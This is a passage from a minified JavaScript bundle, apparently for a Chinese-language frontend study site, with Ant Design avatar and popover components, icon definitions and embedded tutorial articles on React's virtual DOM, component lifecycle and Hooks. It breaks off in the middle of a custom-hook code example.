${t}`]:{marginInlineStart:o}}}})(n)]},e=>{let{controlHeight:t,controlHeightLG:r,controlHeightSM:n,fontSize:o,fontSizeLG:a,fontSizeXL:i,fontSizeHeading3:s,marginXS:l,marginXXS:c,colorBorderBg:u}=e;return{containerSize:t,containerSizeLG:r,containerSizeSM:n,textFontSize:o,textFontSizeLG:o,textFontSizeSM:o,iconFontSize:Math.round((a+i)/2),iconFontSizeLG:s,iconFontSizeSM:o,groupSpace:c,groupOverlapping:-l,groupBorderColor:u}}),k=r.forwardRef((e,t)=>{let n,{prefixCls:o,shape:a,size:i,src:s,srcSet:d,icon:h,className:v,rootClassName:S,style:x,alt:C,draggable:k,children:$,crossOrigin:E,gap:P=4,onError:T,...I}=e,[M,R]=r.useState(1),[A,D]=r.useState(!1),[L,_]=r.useState(!0),O=r.useRef(null),N=r.useRef(null),F=(0,c.composeRef)(t,O),{getPrefixCls:j,className:H,style:B}=(0,m.useComponentConfig)("avatar"),z=r.useContext(y),V=()=>{if(!N.current||!O.current)return;let e=N.current.offsetWidth,t=O.current.offsetWidth;0!==e&&0!==t&&2*P<t&&R(t-2*P<e?(t-2*P)/e:1)};r.useEffect(()=>{D(!0)},[]),r.useEffect(()=>{_(!0),R(1)},[s]),r.useEffect(V,[P]);let W=(0,g.default)(e=>i??z?.size??e??"medium"),U=b(Object.keys("object"==typeof W&&W||{}).some(e=>p.includes(e))),q=r.useMemo(()=>{if("object"!=typeof W)return{};let e=W[p.find(e=>U[e])];return e?{width:e,height:e,fontSize:e&&(h||$)?e/2:18}:{}},[U,W,h,$]),G=j("avatar",o),J=(0,f.default)(G),[X,K]=w(G,J),Q=(0,u.clsx)({[`${G}-lg`]:"large"===W,[`${G}-sm`]:"small"===W}),Y=r.isValidElement(s),Z=a||z?.shape||"circle",ee=(0,u.clsx)(G,Q,H,`${G}-${Z}`,{[`${G}-image`]:Y||s&&L,[`${G}-icon`]:!!h},K,J,v,S,X),et="number"==typeof W?{width:W,height:W,fontSize:h?W/2:18}:{};if("string"==typeof s&&L)n=r.createElement("img",{src:s,draggable:k,srcSet:d,onError:()=>{!1!==T?.()&&_(!1)},alt:C,crossOrigin:E});else if(Y)n=s;else if(h)n=h;else if(A||1!==M){let e=`scale(${M})`;n=r.createElement(l.default,{onResize:V},r.createElement("span",{className:`${G}-string`,ref:N,style:{msTransform:e,WebkitTransform:e,transform:e}},$))}else n=r.createElement("span",{className:`${G}-string`,style:{opacity:0},ref:N},$);return r.createElement("span",{...I,style:{...et,...q,...B,...x},className:ee,ref:F},n)});e.i(63335);var $=e.i(43081),E=e.i(63731),P=e.i(30294);let T=e=>e?"function"==typeof e?e():e:null;var I=e.i(11517),M=e.i(13541),R=e.i(91816),A=e.i(96158);e.i(37908);var D=e.i(92656),L=e.i(17356),_=e.i(20560),O=e.i(7358),N=e.i(17933);let F=(0,x.genStyleHooks)("Popover",e=>{let{colorBgElevated:t,colorText:r}=e,n=(0,C.mergeToken)(e,{popoverBg:t,popoverColor:r});return[(e=>{let{componentCls:t,popoverColor:r,titleMinWidth:n,fontWeightStrong:o,innerPadding:a,boxShadowSecondary:i,colorTextHeading:s,borderRadiusLG:l,zIndexPopup:c,titleMarginBottom:u,colorBgElevated:d,popoverBg:p,titleBorderBottom:m,innerContentPadding:f,titlePadding:g,antCls:h}=e,[b,y]=(0,x.genCssVar)(h,"tooltip");return[{[t]:{...(0,S.resetComponent)(e),position:"absolute",top:0,left:{_skip_check_:!0,value:0},zIndex:c,fontWeight:"normal",whiteSpace:"normal",textAlign:"start",cursor:"auto",userSelect:"text",[b("valid-offset-x")]:y("arrow-offset-x","var(--arrow-x)"),transformOrigin:[y("valid-offset-x","50%"),"var(--arrow-y, 50%)"].join(" "),[b("arrow-background-color")]:d,width:"max-content",maxWidth:"100vw","&-rtl":{direction:"rtl"},"&-hidden":{display:"none"},[`${t}-content`]:{position:"relative"},[`${t}-container`]:{backgroundColor:p,backgroundClip:"padding-box",borderRadius:l,boxShadow:i,padding:a},[`${t}-title`]:{minWidth:n,marginBottom:u,color:s,fontWeight:o,borderBottom:m,padding:g},[`${t}-content`]:{color:r,padding:f}}},(0,_.default)(e,y("arrow-background-color")),{[`${t}-pure`]:{position:"relative",maxWidth:"none",margin:e.sizePopupArrow,display:"inline-block"}}]})(n),(e=>{let{componentCls:t,antCls:r}=e,[n]=(0,x.genCssVar)(r,"tooltip");return{[t]:N.PresetColors.map(r=>{let o=e[`${r}6`];return{[`&${t}-${r}`]:{[n("arrow-background-color")]:o,[`${t}-inner`]:{backgroundColor:o},[`${t}-arrow`]:{background:"transparent"}}}})}})(n),(0,L.initZoomMotion)(n,"zoom-big")]},e=>{let{lineWidth:t,controlHeight:r,fontHeight:n,padding:o,wireframe:a,zIndexPopupBase:i,borderRadiusLG:s,marginXS:l,lineType:c,colorSplit:u,paddingSM:d}=e,p=r-n;return{titleMinWidth:177,zIndexPopup:i+30,...(0,O.getArrowToken)(e),...(0,_.getArrowOffsetToken)({contentRadius:s,limitVerticalRadius:!0}),innerPadding:12*!a,titleMarginBottom:a?0:l,titlePadding:a?`${p/2}px ${o}px ${p/2-t}px`:0,titleBorderBottom:a?`${t}px ${c} ${u}`:"none",innerContentPadding:a?`${d}px ${o}px`:0}},{resetStyle:!1,deprecatedTokens:[["width","titleMinWidth"],["minWidth","titleMinWidth"]]}),j=e=>{let{title:t,content:n,prefixCls:o,classNames:a,styles:i}=e;return t||n?r.createElement(r.Fragment,null,t&&r.createElement("div",{className:(0,u.clsx)(`${o}-title`,a?.title),style:i?.title},t),n&&r.createElement("div",{className:(0,u.clsx)(`${o}-content`,a?.content),style:i?.content},n)):null},H=e=>{let{hashId:t,prefixCls:n,className:o,style:a,placement:i="top",title:s,content:l,children:c,classNames:d,styles:p}=e,m=T(s),f=T(l),g={...e,placement:i},[h,b]=(0,I.useMergeSemantic)([d],[p],{props:g}),y=(0,u.clsx)(t,n,`${n}-pure`,`${n}-placement-${i}`,o);return r.createElement("div",{className:y,style:a},r.createElement("div",{className:`${n}-arrow`}),r.createElement(D.Popup,{...e,className:t,prefixCls:n,classNames:h,styles:b},c||r.createElement(j,{prefixCls:n,title:m,content:f,classNames:h,styles:b})))},B=r.forwardRef((e,t)=>{let{prefixCls:n,title:o,content:a,overlayClassName:i,placement:s="top",trigger:l,children:c,mouseEnterDelay:d=.1,mouseLeaveDelay:p=.1,onOpenChange:f,overlayStyle:g={},styles:h,classNames:b,motion:y,arrow:v,...S}=e,{getPrefixCls:x,className:C,style:w,classNames:k,styles:$,arrow:E,trigger:D}=(0,m.useComponentConfig)("popover"),L=x("popover",n),[_,O]=F(L),N=x(),H=(0,A.default)(v,E),B=l||D||"hover",z={...e,placement:s,trigger:B,mouseEnterDelay:d,mouseLeaveDelay:p,overlayStyle:g,styles:h,classNames:b},[V,W]=(0,I.useMergeSemantic)([k,b],[$,h],{props:z}),U=(0,u.clsx)(i,_,O,C,V.root),[q,G]=(0,P.useControlledState)(e.defaultOpen??!1,e.open),J=T(o),X=T(a);return r.createElement(R.default,{unique:!1,arrow:H,placement:s,trigger:B,mouseEnterDelay:d,mouseLeaveDelay:p,...S,prefixCls:L,classNames:{root:U,container:V.container,arrow:V.arrow},styles:{root:{...W.root,...w,...g},container:W.container,arrow:W.arrow},ref:t,open:q,onOpenChange:e=>{G(e),f?.(e)},overlay:J||X?r.createElement(j,{prefixCls:L,title:J,content:X,classNames:V,styles:W}):null,motion:{motionName:(0,M.getTransitionName)(N,"zoom-big","string"==typeof y?.motionName?y?.motionName:void 0)},"data-popover-inject":!0},c)});B._InternalPanelDoNotUseOrYouWillBeFired=e=>{let{prefixCls:t,className:n,...o}=e,{getPrefixCls:a}=r.useContext(m.ConfigContext),i=a("popover",t),[s,l]=F(i);return r.createElement(H,{...o,prefixCls:i,hashId:s,className:(0,u.clsx)(n,l)})};let z=e=>{let{size:t,shape:n}=r.useContext(y),o=r.useMemo(()=>({size:e.size||t,shape:e.shape||n}),[e.size,e.shape,t,n]);return r.createElement(y.Provider,{value:o},e.children)};k.Group=e=>{let{getPrefixCls:t,direction:n}=r.useContext(m.ConfigContext),{prefixCls:o,className:a,rootClassName:i,style:s,maxCount:l,maxStyle:c,size:d,shape:p,maxPopoverPlacement:g,maxPopoverTrigger:h,children:b,max:y}=e,v=t("avatar",o),S=`${v}-group`,x=(0,f.default)(v),[C,P]=w(v,x),T=(0,u.clsx)(S,{[`${S}-rtl`]:"rtl"===n},P,x,a,i,C),I=(0,$.toArray)(b).map((e,t)=>(0,E.cloneElement)(e,{key:`avatar-key-${t}`})),M=y?.count||l,R=I.length;if(M&&M<R){let e=I.slice(0,M),t=I.slice(M,R),n=y?.style||c,o=y?.popover?.trigger||h||"hover",a=y?.popover?.placement||g||"top",i={content:t,...y?.popover,placement:a,trigger:o,rootClassName:(0,u.clsx)(`${S}-popover`,y?.popover?.rootClassName)};return e.push(r.createElement(B,{key:"avatar-popover-key",destroyOnHidden:!0,...i},r.createElement(k,{style:n},`+${R-M}`))),r.createElement(z,{shape:p,size:d},r.createElement("div",{className:T,style:s},e))}return r.createElement(z,{shape:p,size:d},r.createElement("div",{className:T,style:s},I))};let V={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M946.5 505L560.1 118.8l-25.9-25.9a31.5 31.5 0 00-44.4 0L77.5 505a63.9 63.9 0 00-18.8 46c.4 35.2 29.7 63.3 64.9 63.3h42.5V940h691.8V614.3h43.4c17.1 0 33.2-6.7 45.3-18.8a63.6 63.6 0 0018.7-45.3c0-17-6.7-33.1-18.8-45.2zM568 868H456V664h112v204zm217.9-325.7V868H632V640c0-22.1-17.9-40-40-40H432c-22.1 0-40 17.9-40 40v228H238.1V542.3h-96l370-369.7 23.1 23.1L882 542.3h-96.1z"}}]},name:"home",theme:"outlined"};var W=e.i(9583);function U(){return(U=Object.assign.bind()).apply(this,arguments)}let q=r.forwardRef((e,t)=>r.createElement(W.default,U({},e,{ref:t,icon:V}))),G={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M516 673c0 4.4 3.4 8 7.5 8h185c4.1 0 7.5-3.6 7.5-8v-48c0-4.4-3.4-8-7.5-8h-185c-4.1 0-7.5 3.6-7.5 8v48zm-194.9 6.1l192-161c3.8-3.2 3.8-9.1 0-12.3l-192-160.9A7.95 7.95 0 00308 351v62.7c0 2.4 1 4.6 2.9 6.1L420.7 512l-109.8 92.2a8.1 8.1 0 00-2.9 6.1V673c0 6.8 7.9 10.5 13.1 6.1zM880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-40 728H184V184h656v656z"}}]},name:"code",theme:"outlined"};function J(){return(J=Object.assign.bind()).apply(this,arguments)}let X=r.forwardRef((e,t)=>r.createElement(W.default,J({},e,{ref:t,icon:G}))),K={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-696 72h136v656H184V184zm656 656H384V384h456v456zM384 320V184h456v136H384z"}}]},name:"layout",theme:"outlined"};function Q(){return(Q=Object.assign.bind()).apply(this,arguments)}let Y=r.forwardRef((e,t)=>r.createElement(W.default,Q({},e,{ref:t,icon:K}))),Z={icon:{tag:"svg",attrs:{viewBox:"0 0 1024 1024",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64L128 192v384c0 212.1 171.9 384 384 384s384-171.9 384-384V192L512 64zm312 512c0 172.3-139.7 312-312 312S200 748.3 200 576V246l312-110 312 110v330z"}},{tag:"path",attrs:{d:"M378.4 475.1a35.91 35.91 0 00-50.9 0 35.91 35.91 0 000 50.9l129.4 129.4 2.1 2.1a33.98 33.98 0 0048.1 0L730.6 434a33.98 33.98 0 000-48.1l-2.8-2.8a33.98 33.98 0 00-48.1 0L483 579.7 378.4 475.1z"}}]},name:"safety",theme:"outlined"};function ee(){return(ee=Object.assign.bind()).apply(this,arguments)}let et=r.forwardRef((e,t)=>r.createElement(W.default,ee({},e,{ref:t,icon:Z}))),er={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M864 736c0-111.6-65.4-208-160-252.9V317.3c0-15.1-5.3-29.7-15.1-41.2L536.5 95.4C530.1 87.8 521 84 512 84s-18.1 3.8-24.5 11.4L335.1 276.1a63.97 63.97 0 00-15.1 41.2v165.8C225.4 528 160 624.4 160 736h156.5c-2.3 7.2-3.5 15-3.5 23.8 0 22.1 7.6 43.7 21.4 60.8a97.2 97.2 0 0043.1 30.6c23.1 54 75.6 88.8 134.5 88.8 29.1 0 57.3-8.6 81.4-24.8 23.6-15.8 41.9-37.9 53-64a97 97 0 0043.1-30.5 97.52 97.52 0 0021.4-60.8c0-8.4-1.1-16.4-3.1-23.8H864zM762.3 621.4c9.4 14.6 17 30.3 22.5 46.6H700V558.7a211.6 211.6 0 0162.3 62.7zM388 483.1V318.8l124-147 124 147V668H388V483.1zM239.2 668c5.5-16.3 13.1-32 22.5-46.6 16.3-25.2 37.5-46.5 62.3-62.7V668h-84.8zm388.9 116.2c-5.2 3-11.2 4.2-17.1 3.4l-19.5-2.4-2.8 19.4c-5.4 37.9-38.4 66.5-76.7 66.5-38.3 0-71.3-28.6-76.7-66.5l-2.8-19.5-19.5 2.5a27.7 27.7 0 01-17.1-3.5c-8.7-5-14.1-14.3-14.1-24.4 0-10.6 5.9-19.4 14.6-23.8h231.3c8.8 4.5 14.6 13.3 14.6 23.8-.1 10.2-5.5 19.6-14.2 24.5zM464 400a48 48 0 1096 0 48 48 0 10-96 0z"}}]},name:"rocket",theme:"outlined"};function en(){return(en=Object.assign.bind()).apply(this,arguments)}let eo=r.forwardRef((e,t)=>r.createElement(W.default,en({},e,{ref:t,icon:er})));var ea=e.i(34779);let ei={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M692.8 412.7l.2-.2-34.6-44.3a7.97 7.97 0 00-11.2-1.4l-50.4 39.3-70.5-90.1a7.97 7.97 0 00-11.2-1.4l-37.9 29.7a7.97 7.97 0 00-1.4 11.2l70.5 90.2-.2.1 34.6 44.3c2.7 3.5 7.7 4.1 11.2 1.4l50.4-39.3 64.1 82c2.7 3.5 7.7 4.1 11.2 1.4l37.9-29.6c3.5-2.7 4.1-7.7 1.4-11.2l-64.1-82.1zM608 112c-167.9 0-304 136.1-304 304 0 70.3 23.9 135 63.9 186.5L114.3 856.1a8.03 8.03 0 000 11.3l42.3 42.3c3.1 3.1 8.2 3.1 11.3 0l253.6-253.6C473 696.1 537.7 720 608 720c167.9 0 304-136.1 304-304S775.9 112 608 112zm161.2 465.2C726.2 620.3 668.9 644 608 644s-118.2-23.7-161.2-66.8C403.7 534.2 380 476.9 380 416s23.7-118.2 66.8-161.2c43-43.1 100.3-66.8 161.2-66.8s118.2 23.7 161.2 66.8c43.1 43 66.8 100.3 66.8 161.2s-23.7 118.2-66.8 161.2z"}}]},name:"monitor",theme:"outlined"};function es(){return(es=Object.assign.bind()).apply(this,arguments)}let el=r.forwardRef((e,t)=>r.createElement(W.default,es({},e,{ref:t,icon:ei}))),ec={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M740 161c-61.8 0-112 50.2-112 112 0 50.1 33.1 92.6 78.5 106.9v95.9L320 602.4V318.1c44.2-15 76-56.9 76-106.1 0-61.8-50.2-112-112-112s-112 50.2-112 112c0 49.2 31.8 91 76 106.1V706c-44.2 15-76 56.9-76 106.1 0 61.8 50.2 112 112 112s112-50.2 112-112c0-49.2-31.8-91-76-106.1v-27.8l423.5-138.7a50.52 50.52 0 0034.9-48.2V378.2c42.9-15.8 73.6-57 73.6-105.2 0-61.8-50.2-112-112-112zm-504 51a48.01 48.01 0 0196 0 48.01 48.01 0 01-96 0zm96 600a48.01 48.01 0 01-96 0 48.01 48.01 0 0196 0zm408-491a48.01 48.01 0 010-96 48.01 48.01 0 010 96z"}}]},name:"branches",theme:"outlined"};function eu(){return(eu=Object.assign.bind()).apply(this,arguments)}let ed=r.forwardRef((e,t)=>r.createElement(W.default,eu({},e,{ref:t,icon:ec}))),ep={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M848 359.3H627.7L825.8 109c4.1-5.3.4-13-6.3-13H436c-2.8 0-5.5 1.5-6.9 4L170 547.5c-3.1 5.3.7 12 6.9 12h174.4l-89.4 357.6c-1.9 7.8 7.5 13.3 13.3 7.7L853.5 373c5.2-4.9 1.7-13.7-5.5-13.7zM378.2 732.5l60.3-241H281.1l189.6-327.4h224.6L487 427.4h211L378.2 732.5z"}}]},name:"thunderbolt",theme:"outlined"};function em(){return(em=Object.assign.bind()).apply(this,arguments)}let ef=r.forwardRef((e,t)=>r.createElement(W.default,em({},e,{ref:t,icon:ep}))),eg=[{id:"react",name:"React 生态",icon:"⚛️",count:16,description:"React 相关的核心概念、生态系统和最佳实践"},{id:"javascript",name:"JavaScript/TypeScript",icon:"📜",count:14,description:"JavaScript 和 TypeScript 核心概念、高级特性和最佳实践"},{id:"css",name:"CSS 布局",icon:"🎨",count:15,description:"CSS 布局、样式设计和响应式开发的核心知识"},{id:"vue",name:"Vue 生态",icon:"💚",count:6,description:"Vue.js 框架的核心概念、生态系统和最佳实践"},{id:"performance",name:"性能优化",icon:"⚡",count:15,description:"前端性能优化的核心策略和最佳实践"},{id:"security",name:"前端安全",icon:"🔒",count:15,description:"前端安全的核心概念和防护策略"},{id:"engineering",name:"工程化",icon:"🏗️",count:15,description:"前端工程化的核心概念和最佳实践"},{id:"browser",name:"浏览器原理",icon:"🌐",count:15,description:"浏览器的工作原理和核心技术"},{id:"ai",name:"AI 学习",icon:"🤖",count:6,description:"人工智能相关的核心概念、工具和最佳实践，涵盖AI Agent、LangChain、大语言模型等前沿技术"}],eh=[{id:"react-fundamentals",title:"React 核心原理与虚拟 DOM",category:"react",difficulty:"medium",tags:["React","虚拟 DOM","组件","状态管理"],content:`## React 核心原理与虚拟 DOM

React 是一个用于构建用户界面的 JavaScript 库，其核心原理包括虚拟 DOM、组件化和单向数据流。

### ⚛️ 虚拟 DOM 原理

虚拟 DOM 是 React 性能优化的关键。它是一个轻量级的 JavaScript 对象，用来描述真实 DOM 的结构。当组件状态变化时，React 会先更新虚拟 DOM，然后通过 diff 算法计算出最小的 DOM 操作，最后批量应用到真实 DOM 上。

**虚拟 DOM 的优势：**
- **减少直接操作 DOM 的次数，提高性能**
- **提供跨平台能力，如 React Native**
- **简化状态管理和组件更新逻辑**

### 💻 代码示例：虚拟 DOM 对比

\`\`\`javascript
// 真实 DOM 操作
const element = document.createElement('div');
element.className = 'container';
element.textContent = 'Hello, World!';
document.body.appendChild(element);

// 虚拟 DOM（React）
const element = React.createElement(
  'div',
  { className: 'container' },
  'Hello, World!'
);

// JSX 语法（编译为 React.createElement）
const element = (
  <div className="container">
    Hello, World!
  </div>
);
\`\`\`

#### 🔄 React 渲染流程示例

\`\`\`javascript
// 1. 初始渲染
function App() {
  const [count, setCount] = React.useState(0);
  
  return (
    <div>
      <h1>Count: {count}</h1>
      <button onClick={() => setCount(count + 1)}>
        Increment
      </button>
    </div>
  );
}

// 2. 状态变化
// 用户点击按钮，setCount(count + 1) 被调用

// 3. 创建新的虚拟 DOM
// React 根据新的状态创建新的虚拟 DOM 树

// 4. Diff 算法
// React 比较新旧虚拟 DOM 树，找出差异

// 5. 最小化 DOM 操作
// React 只更新变化的部分（例如，只更新文本节点）

// 6. 批量更新
// React 将多个状态更新合并为一次 DOM 操作
\`\`\`

### 🧩 组件化思想

React 的组件化思想让代码更加模块化和可维护：
- **组件是独立的、可复用的代码单元**
- **每个组件有自己的状态和属性**
- **组件通过 props 传递数据，通过 state 管理内部状态**

### 💻 代码示例：组件化实践

\`\`\`javascript
// 函数组件
function Welcome(props) {
  return <h1>Hello, {props.name}!</h1>;
}

// 使用组件
function App() {
  return (
    <div>
      <Welcome name="Alice" />
      <Welcome name="Bob" />
    </div>
  );
}

// 类组件
class Welcome extends React.Component {
  render() {
    return <h1>Hello, {this.props.name}!</h1>;
  }
}

// 组合组件
function Card({ title, content, footer }) {
  return (
    <div className="card">
      <div className="card-header">{title}</div>
      <div className="card-body">{content}</div>
      <div className="card-footer">{footer}</div>
    </div>
  );
}

function App() {
  return (
    <Card
      title="Card Title"
      content={<p>Card content goes here.</p>}
      footer={<button>Action</button>}
    />
  );
}
\`\`\`

### 单向数据流

React 采用单向数据流，数据从父组件流向子组件：
- 父组件通过 props 向子组件传递数据
- 子组件通过回调函数与父组件通信
- 状态管理更加清晰可预测

### 代码示例

#### 单向数据流示例

\`\`\`javascript
// 父组件
function Parent() {
  const [count, setCount] = React.useState(0);
  
  const increment = () => {
    setCount(count + 1);
  };
  
  return (
    <div>
      <h1>Parent Count: {count}</h1>
      <Child count={count} onIncrement={increment} />
    </div>
  );
}

// 子组件
function Child({ count, onIncrement }) {
  return (
    <div>
      <h2>Child Count: {count}</h2>
      <button onClick={onIncrement}>Increment</button>
    </div>
  );
}

// 状态提升
// 多个子组件共享状态时，将状态提升到最近的共同父组件
function Parent() {
  const [value, setValue] = React.useState('');
  
  return (
    <div>
      <Input value={value} onChange={setValue} />
      <Display value={value} />
    </div>
  );
}

function Input({ value, onChange }) {
  return <input value={value} onChange={(e) => onChange(e.target.value)} />;
}

function Display({ value }) {
  return <p>Value: {value}</p>;
}
\`\`\`

### 生命周期

React 组件的生命周期包括挂载、更新和卸载三个阶段：
- 挂载阶段：constructor → render → componentDidMount：React组件的生命周期挂载阶段包括三个主要方法，constructor是组件创建时调用的构造函数，用于初始化state和绑定方法，render方法负责返回JSX描述的UI结构，componentDidMount在组件挂载到DOM后立即调用，是进行DOM操作、网络请求、订阅事件等副作用操作的最佳时机，挂载阶段只执行一次，是组件生命周期的起点
- 更新阶段：shouldComponentUpdate → render → componentDidUpdate：React组件的更新阶段在props或state变化时触发，shouldComponentUpdate用于决定是否需要重新渲染，返回false可以跳过渲染优化性能，render方法根据新的props和state返回新的JSX，componentDidUpdate在组件更新后调用，可以访问更新前的props和state，是进行DOM操作、网络请求等副作用操作的时机，更新阶段可能执行多次
- 卸载阶段：componentWillUnmount：React组件的卸载阶段只包含componentWillUnmount一个方法，在组件从DOM中移除前调用，是进行清理操作的最佳时机，如清除定时器、取消网络请求、移除事件监听器、清理订阅等，componentWillUnmount只执行一次，是组件生命周期的终点，不正确的清理可能导致内存泄漏

### 代码示例

#### 类组件生命周期示例

\`\`\`javascript
class LifecycleComponent extends React.Component {
  constructor(props) {
    super(props);
    this.state = { count: 0 };
    console.log('Constructor');
  }
  
  componentDidMount() {
    console.log('Component did mount');
    // 发起网络请求
    this.fetchData();
    // 设置定时器
    this.timer = setInterval(() => {
      this.setState({ count: this.state.count + 1 });
    }, 1000);
  }
  
  componentDidUpdate(prevProps, prevState) {
    console.log('Component did update');
    // 检查 props 或 state 是否变化
    if (prevProps.id !== this.props.id) {
      this.fetchData();
    }
  }
  
  componentWillUnmount() {
    console.log('Component will unmount');
    // 清理定时器
    clearInterval(this.timer);
    // 取消网络请求
    if (this.abortController) {
      this.abortController.abort();
    }
  }
  
  fetchData() {
    this.abortController = new AbortController();
    fetch(\`/api/data/\${this.props.id}\`, {
      signal: this.abortController.signal
    })
      .then(response => response.json())
      .then(data => this.setState({ data }))
      .catch(error => console.error('Error:', error));
  }
  
  render() {
    return (
      <div>
        <h1>Count: {this.state.count}</h1>
        <p>Props: {this.props.id}</p>
      </div>
    );
  }
}
\`\`\`

#### Hooks 生命周期示例

\`\`\`javascript
function LifecycleComponent({ id }) {
  const [count, setCount] = React.useState(0);
  const [data, setData] = React.useState(null);
  
  // 挂载和更新
  React.useEffect(() => {
    console.log('Effect ran');
    
    // 发起网络请求
    const abortController = new AbortController();
    fetch(\`/api/data/\${id}\`, {
      signal: abortController.signal
    })
      .then(response => response.json())
      .then(data => setData(data))
      .catch(error => console.error('Error:', error));
    
    // 清理函数（卸载或依赖变化时执行）
    return () => {
      console.log('Cleanup');
      abortController.abort();
    };
  }, [id]); // 依赖数组
  
  // 挂载
  React.useEffect(() => {
    console.log('Component mounted');
    
    // 设置定时器
    const timer = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
    
    // 清理定时器
    return () => clearInterval(timer);
  }, []); // 空依赖数组，只在挂载时执行
  
  return (
    <div>
      <h1>Count: {count}</h1>
      <p>Props: {id}</p>
      {data && <pre>{JSON.stringify(data, null, 2)}</pre>}
    </div>
  );
}
\`\`\`

### 最佳实践

- 使用函数组件和 Hooks 代替 class 组件
- 合理使用 state 和 props，避免不必要的渲染
- 使用 key 属性提高列表渲染性能
- 组件拆分要合理，保持单一职责原则
- 使用 React.memo 优化组件渲染
- 使用 useMemo 和 useCallback 优化性能
- 避免在渲染中创建新对象和函数
- 合理使用 Context API`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-hooks",title:"React Hooks 深度解析",category:"react",difficulty:"medium",tags:["React","Hooks","useState","useEffect"],content:`## React Hooks 深度解析

React Hooks 是 React 16.8 引入的革命性特性，它彻底改变了 React 组件的编写方式，让函数组件也能拥有状态和生命周期特性，同时解决了 class 组件中 this 指向混乱、生命周期方法逻辑分散等问题。

### 常用 Hooks 详解

**useState - 状态管理基础：**
useState 是最基础的 Hook，用于在函数组件中添加状态管理能力。它接收一个初始值或初始化函数，返回一个包含当前状态值和更新函数的数组。useState 支持函数式更新，可以在更新函数中接收前一个状态值，这在处理异步更新或基于前值计算新值时特别有用。惰性初始化允许传入一个函数作为初始值，该函数只在首次渲染时执行，适合需要复杂计算的初始状态。

**useEffect - 副作用处理核心：**
useEffect 是处理副作用的核心 Hook，包括数据获取、订阅、DOM 操作、定时器等。它接收一个回调函数和一个可选的依赖数组，当依赖数组中的值发生变化时执行回调。空依赖数组表示只在组件挂载和卸载时执行，不传依赖数组则每次渲染都执行。useEffect 的清理函数在组件卸载或下一次 effect 执行前调用，用于取消订阅、清除定时器等资源释放操作。

**useRef - 可变引用与 DOM 访问：**
useRef 返回一个可变的 ref 对象，其 current 属性可以保存任意值，且在整个组件生命周期内保持不变。useRef 的主要用途包括：访问 DOM 元素（通过将 ref 传递给 JSX 元素）、保存可变值而不触发重新渲染、存储前一次渲染的值。与 useState 不同，修改 useRef.current 不会触发组件重新渲染，这使得它非常适合存储不影响渲染的数据。

**useMemo - 计算结果缓存：**
useMemo 用于缓存昂贵的计算结果，避免在每次渲染时重复计算。它接收一个计算函数和依赖数组，只有当依赖项变化时才重新计算。useMemo 特别适合处理复杂的数据转换、过滤、排序等操作，可以有效减少不必要的计算开销。但需要注意，useMemo 本身也有开销，对于简单的计算可能得不偿失。

**useCallback - 函数引用缓存：**
useCallback 用于缓存函数引用，避免在每次渲染时创建新的函数实例。它接收一个回调函数和依赖数组，返回一个记忆化的回调函数。useCallback 主要用于优化子组件的渲染性能，特别是当子组件使用 React.memo 或依赖函数引用相等性时。与 useMemo 不同，useCallback 缓存的是函数本身，而不是函数的返回值。

### 代码示例

\`\`\`javascript
// useState 基础用法
function Counter() {
  const [count, setCount] = useState(0);
  const [items, setItems] = useState([]);
  
  // 函数式更新
  const increment = () => setCount(prev => prev + 1);
  
  // 惰性初始化
  const [data, setData] = useState(() => {
    const saved = localStorage.getItem('data');
    return saved ? JSON.parse(saved) : [];
  });
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+1</button>
    </div>
  );
}

// useEffect 数据获取与清理
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    let cancelled = false;
    
    async function fetchUser() {
      const response = await fetch(\`/api/users/\${userId}\`);
      const data = await response.json();
      if (!cancelled) {
        setUser(data);
      }
    }
    
    fetchUser();
    
    return () => {
      cancelled = true;
    };
  }, [userId]);
  
  if (!user) return <div>Loading...</div>;
  return <div>{user.name}</div>;
}

// useRef 访问 DOM
function TextInput() {
  const inputRef = useRef(null);
  
  const focusInput = () => {
    inputRef.current?.focus();
  };
  
  return (
    <div>
      <input ref={inputRef} type="text" />
      <button onClick={focusInput}>Focus Input</button>
    </div>
  );
}

// useMemo 和 useCallback 优化
function ExpensiveComponent({ items, onItemClick }) {
  // 缓存排序结果
  const sortedItems = useMemo(() => {
    console.log('Sorting items...');
    return [...items].sort((a, b) => a.name.localeCompare(b.name));
  }, [items]);
  
  // 缓存事件处理函数
  const handleClick = useCallback((id) => {
    console.log('Item clicked:', id);
    onItemClick?.(id);
  }, [onItemClick]);
  
  return (
    <ul>
      {sortedItems.map(item => (
        <li key={item.id} onClick={() => handleClick(item.id)}>
          {item.name}
        </li>
      ))}
    </ul>
  );
}

// 自定义 Hook 示例
function useLocalStorage(key, initialValue) {
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch (error) {
      console.error(error);
      return initialValue;
    }
  });
  
  const setValue = useCallback((value) => {
    try {
      const valueToStore = value instanceof Function ? value(storedValue) : value;
      setStoredValue(valueToStore);
      localStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.error(error);
    }
  }, [key, storedValue]);
  
  return [storedValue, setValue];
}

// 使用自定义 Hook
function ThemeToggle() {
  const [theme, setTheme] = useLocalStorage('theme', 'light');
  
  const toggleTheme = () => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  };
